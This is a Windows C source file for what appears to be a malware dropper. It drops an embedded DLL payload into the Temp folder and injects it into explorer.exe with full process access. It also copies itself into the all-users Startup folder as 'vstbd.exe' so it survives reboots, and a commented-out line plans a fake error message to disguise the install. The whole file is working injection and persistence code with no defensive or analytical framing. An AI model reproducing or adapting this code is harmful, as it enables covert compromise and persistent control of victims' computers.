#include "pch.h"
#include "entry.h"
#include "function_wrappers.h"


int __stdcall wWinMain(
    IN HINSTANCE Instance,
    IN OPTIONAL HINSTANCE PrevInstance,
    IN LPWSTR CmdLine,
    IN int CmdShow
)
{
    UNREFERENCED_PARAMETER( Instance );
    UNREFERENCED_PARAMETER( PrevInstance );
    UNREFERENCED_PARAMETER( CmdLine );
    UNREFERENCED_PARAMETER( CmdShow );

    LoadDll( );

    // if we arent able to make us, or if we already aren't persistant - prompt that we need admin and exit.
    if (!MakePersistant());
    //    MessageBoxA( NULL, "Needs to be run as admin", "Error", MB_OK | MB_ICONERROR );

    return 0;
}

BOOL
MakePersistant(
    VOID
)
{
    PWSTR Path;
    WCHAR ModulePath[ MAX_PATH ];
    WCHAR NewExecutablePath[ MAX_PATH ];
    uint32_t FileSize;
    DWORD SizeRead;
    HANDLE InFile;
    FILE* OutFile;
    PVOID FileBuffer;
    BOOL ReturnVal;

    // get paths (path we will write the new exe to, and path of current exe
    WrapSHGetKnownFolderPath( FOLDERID_CommonStartup, 0, NULL, &Path );
    GetModuleFileNameW( NULL, ModulePath, MAX_PATH );

    // make the path for the new exe
    lstrcpyW( NewExecutablePath, Path );
    wcscat_s( NewExecutablePath, MAX_PATH, L"\\vstbd.exe" );

    // if target exe and current module is the same - we are successful.
    if ( !lstrcmpiW( NewExecutablePath, ModulePath ) )
        return TRUE;

    // Open current executable
    InFile = WrapCreateFileW( ModulePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL );
    if ( !InFile )
        return FALSE;

    // assume fail
    ReturnVal = FALSE;

    // copy the current executable to a buffer
    FileSize = GetFileSize( InFile, NULL );
    FileBuffer = VirtualAlloc( NULL, FileSize, MEM_COMMIT, PAGE_READWRITE );
    WrapReadFile( InFile, FileBuffer, FileSize, &SizeRead, NULL );
    CloseHandle( InFile );

    // as long as current module is not target module, and the opening of the file is successful - write the file in target location
    if ( !_wfopen_s( &OutFile, NewExecutablePath, L"wb" ) )
    {
        fwrite( FileBuffer, sizeof( uint8_t ), FileSize, OutFile );
        fclose( OutFile );

        // if we got here it means we have admin privileges and was able to write the file - return true
        ReturnVal = TRUE;
    }

    // free up the memory we allocated
    VirtualFree( FileBuffer, 0, MEM_RELEASE );

    // display a fake error message if we successfully wrote the file to keep persistant.
    //if ( ReturnVal )
    //    MessageBoxA( NULL, "ERROR: Incompatible Windows version", "Error", MB_OK | MB_ICONERROR );

    return ReturnVal;
}

VOID
LoadDll(
    VOID
)
{
    CHAR TempPath[ MAX_PATH ];
    FILE* File;
    UINT32 Pid;
    HANDLE Process;
    CHAR Name[ MAX_PATH ];

    strcat_s( Name, MAX_PATH, "explorer.exe" );

    Pid = MapperGetPid( Name );
    Process = WrapOpenProcess( PROCESS_ALL_ACCESS, FALSE, Pid );

    if ( !Process )
        return;

    // make a path for a .dll in the Temp folder
    GetTempPathA( MAX_PATH, TempPath );
    strcat_s( TempPath, MAX_PATH, "vstbd.dll" );

    if ( !fopen_s( &File, TempPath, "wb" ) )
    {
        fwrite( rawData, sizeof( uint8_t ), sizeof( rawData ), File );
        fclose( File );

        MapperLoadLibrary( Process, TempPath );
    }
}